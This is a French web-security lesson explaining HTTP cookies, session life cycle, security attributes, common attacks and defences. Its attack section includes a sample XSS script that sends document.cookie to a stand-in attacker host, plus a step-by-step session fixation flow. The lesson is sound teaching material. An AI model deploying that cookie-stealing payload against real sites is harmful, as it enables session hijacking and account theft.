<section class="content-block">
    <h2><i class="fas fa-info-circle" aria-hidden="true"></i> Fondamentaux des Cookies</h2>
    <p>
        Le protocole HTTP est dit "sans état" (stateless). Cela signifie que chaque requête envoyée par un client à un serveur est un événement indépendant. Le serveur ne conserve nativement aucune information sur les requêtes précédentes. Sans un mécanisme additionnel, il est impossible de maintenir une session utilisateur cohérente (garder un utilisateur connecté, son panier, etc.).
    </p>
    <p>
        <strong>Une analogie simple :</strong> Imaginez un vendeur qui a une mémoire de poisson rouge. Chaque fois que vous lui parlez, il ne se souvient pas de qui vous êtes. C'est le problème du HTTP "sans état".
    </p>
    <p>
        La solution est le cookie : une petite information textuelle. Le serveur donne ce "ticket" au navigateur via l'en-tête de réponse <code>Set-Cookie</code>. Le navigateur le présente ensuite à chaque nouvelle requête via l'en-tête <code>Cookie</code>, permettant au serveur de se "souvenir" de vous.
    </p>
<pre><code># 1. Première visite (sans cookie)
CLIENT → SERVEUR: GET /page1
SERVEUR → CLIENT: Contenu de la page + Set-Cookie: id=xyz123

# 2. Visite suivante (le navigateur renvoie le cookie)
CLIENT → SERVEUR: GET /page2 + Cookie: id=xyz123
SERVEUR → CLIENT: Contenu de la page (le serveur sait que c'est le même visiteur)</code></pre>
    <h3>Classification des Cookies</h3>
    <ul>
        <li><strong>Cookies de Session :</strong> Ils n'ont pas de date d'expiration et sont supprimés dès que le navigateur est fermé. Ils sont utilisés pour stocker des informations temporaires comme l'état de connexion.</li>
        <li><strong>Cookies Persistants :</strong> Ils possèdent une date d'expiration (attribut <code>Expires</code> ou <code>Max-Age</code>) et sont conservés sur le disque de l'utilisateur. Ils servent à mémoriser des préférences.</li>
    </ul>
</section>

<section class="content-block">
    <h2><i class="fas fa-sync-alt" aria-hidden="true"></i> Cycle de Vie et Anatomie d'un Cookie de Session</h2>
    <p>
        Le cycle de vie d'un cookie de session commence typiquement lors de l'authentification.
    </p>
    <h3>Flux d'Authentification Détaillé</h3>
    <ul>
        <li><strong>Étape 1 (Client → Serveur) :</strong> L'utilisateur soumet ses identifiants via une requête <code>POST</code> vers l'URL <code>/login</code>.</li>
        <li><strong>Étape 2 (Serveur) :</strong> Le serveur valide les informations. Il génère un identifiant de session unique et aléatoire (ex: <code>u7xGz...</code>) et le stocke de son côté (ex: dans une base de données <code>Redis</code> ou <code>Memcached</code>) en l'associant à l'utilisateur.</li>
        <li><strong>Étape 3 (Serveur → Client) :</strong> Le serveur renvoie une réponse HTTP avec un en-tête <code>Set-Cookie</code> pour que le navigateur stocke l'identifiant.</li>
    </ul>
    <p><u>Exemple d'en-tête envoyé par le serveur :</u></p>
<pre><code>HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=u7xGz...; Path=/; HttpOnly; Secure; SameSite=Lax</code></pre>
    <p>
        Pour toutes les requêtes suivantes vers ce site, le navigateur ajoutera automatiquement un en-tête <code>Cookie</code>, permettant au serveur de reconnaître l'utilisateur.
    </p>
<pre><code># Requête suivante du navigateur vers le même site
GET /mon-profil HTTP/1.1
Host: exemple.com
Cookie: sessionid=u7xGz...</code></pre>
    <h3>Analyse des Attributs de Sécurité</h3>
    <ul>
        <li><strong><code>HttpOnly</code> :</strong> Interdit l'accès au cookie via JavaScript (<code>document.cookie</code>). C'est une défense cruciale contre les attaques XSS.</li>
        <li><strong><code>Secure</code> :</strong> Contraint le navigateur à n'envoyer le cookie que via des requêtes chiffrées en HTTPS. Il empêche son interception en clair.</li>
        <li><strong><code>SameSite</code> (Strict/Lax/None) :</strong> Contrôle si le cookie doit être envoyé lors de requêtes initiées depuis des sites tiers, protégeant contre les attaques Cross-Site Request Forgery (CSRF). <code>Lax</code> est un bon équilibre, tandis que <code>Strict</code> offre la meilleure protection.</li>
        <li><strong><code>Domain</code> et <code>Path</code> :</strong> Définissent la portée du cookie (à quels domaines et chemins il doit être envoyé).</li>
    </ul>
</section>

<section class="content-block">
    <h2><i class="fas fa-user-secret" aria-hidden="true"></i> Vecteurs d'Attaques et Exploitation</h2>
    <p>Une mauvaise gestion des cookies de session expose les utilisateurs à des risques critiques.</p>

    <h3>Détournement de Session (Session Hijacking)</h3>
    <p>
        Consiste à intercepter le trafic (<code>Packet Sniffing</code>) sur un réseau non sécurisé (ex: Wi-Fi public). Si le cookie n'a pas l'attribut <code>Secure</code> et que la connexion n'est pas en <code>HTTPS</code>, un attaquant peut le capturer et usurper l'identité de la victime. C'est une attaque de type "Homme du milieu" (<code>Man-in-the-Middle</code> ou <code>MITM</code>).
    </p>

    <h3>Vol de Cookie par Cross-Site Scripting (XSS)</h3>
    <p>
        Si un site est vulnérable à une faille <code>XSS</code>, un attaquant peut injecter un script. Si le cookie n'a pas l'attribut <code>HttpOnly</code>, ce script peut lire le cookie et l'envoyer au serveur de l'attaquant.
    </p>
    <p><u>Exemple de charge utile XSS pour voler un cookie :</u></p>
<pre><code>&lt;script&gt;
  // Ce script envoie le cookie de l'utilisateur vers un site contrôlé par l'attaquant
  fetch('https://attaquant.com/log?cookie=' + document.cookie);
&lt;/script&gt;</code></pre>

    <h3>Falsification de Requête Inter-Sites (CSRF)</h3>
    <p>
        Cette attaque force le navigateur d'un utilisateur déjà authentifié à exécuter une action non désirée sur un site web de confiance. L'attaquant crée une page ou un e-mail piégé (ex: une image cachée) qui, lorsqu'il est chargé par la victime, envoie une requête vers un autre site (ex: sa banque) en utilisant son cookie de session. L'attribut <code>SameSite</code> est la principale défense contre cette attaque.
    </p>

    <h3>Fixation de Session</h3>
    <p>
        L'attaquant force le navigateur d'une victime à utiliser un identifiant de session qu'il connaît déjà, <strong>avant</strong> que la victime ne se connecte. Le serveur, vulnérable, ne génère pas de nouvel identifiant après la connexion, associant le compte de la victime à l'ID de l'attaquant.
    </p>
<pre><code># Flux d'une attaque par Fixation de Session

1. ATTAQUANT → SERVEUR : Vais sur le site, j'obtiens un ID de session (ex: 12345).

2. ATTAQUANT → VICTIME : "Regarde ce lien cool !" (envoie un lien du type : http://site-vulnerable.com?sessionid=12345).

3. VICTIME → SERVEUR : Clique sur le lien. Son navigateur utilise maintenant l'ID de session 12345. Elle se connecte avec son propre compte.

4. SERVEUR (vulnérable) : Authentifie la victime, mais associe son compte à l'ID 12345 au lieu d'en créer un nouveau.

5. ATTAQUANT → SERVEUR : Accède au site avec l'ID de session 12345 et est maintenant connecté en tant que la victime.</code></pre>
</section>

<section class="content-block">
    <h2><i class="fas fa-shield-alt" aria-hidden="true"></i> Stratégies de Défense et Bonnes Pratiques</h2>
    <p>
        La sécurisation des sessions repose sur une configuration stricte des cookies et une gestion rigoureuse de leur cycle de vie.
    </p>
    <h3>Check-list de Sécurisation Avancée</h3>
    <ul>
        <li><strong>Utiliser <code>HttpOnly</code> et <code>Secure</code> systématiquement :</strong> C'est la défense de base non négociable.</li>
        <li><strong>Implémenter 'SameSite=Lax' ou 'Strict' :</strong> Une mesure efficace pour prévenir les attaques <code>CSRF</code>.</li>
        <li><strong>Régénérer l'ID de session à chaque changement de privilège :</strong> Il est impératif de générer un nouvel identifiant après une connexion réussie pour contrer la fixation de session.</li>
        <li><strong>Configurer un Timeout de session court :</strong> Définir une durée de vie courte pour les sessions inactives (ex: 15-30 minutes) afin de réduire la fenêtre d'opportunité pour un attaquant.</li>
        <li><strong>Utiliser des identifiants de session longs et aléatoires :</strong> Les ID doivent être générés par un générateur de nombres aléatoires cryptographiquement sûr (<code>CSPRNG</code>) pour être imprédictibles.</li>
        <li><strong>Lier la session à des attributs utilisateur :</strong> Pour une sécurité accrue, on peut lier la session à l'adresse IP ou au <code>User-Agent</code> de l'utilisateur. Si ces valeurs changent, la session est invalidée (attention, cela peut causer des problèmes pour les utilisateurs sur réseaux mobiles).</li>
    </ul>
</section>

<section class="content-block">
    <h2><i class="fas fa-flag-checkered" aria-hidden="true"></i> Conclusion</h2>
    <p>
        La gestion des sessions via les cookies est un pilier de l'expérience web, mais elle constitue aussi une surface d'attaque majeure. Comprendre le cycle de vie d'un cookie, la signification de ses attributs de sécurité et les vecteurs d'attaque courants est une nécessité. Une configuration rigoureuse est essentielle pour protéger les comptes et les données des utilisateurs.
    </p>
    <p>
        Leçon créée par Hugo Bruchon.
    </p>
</section>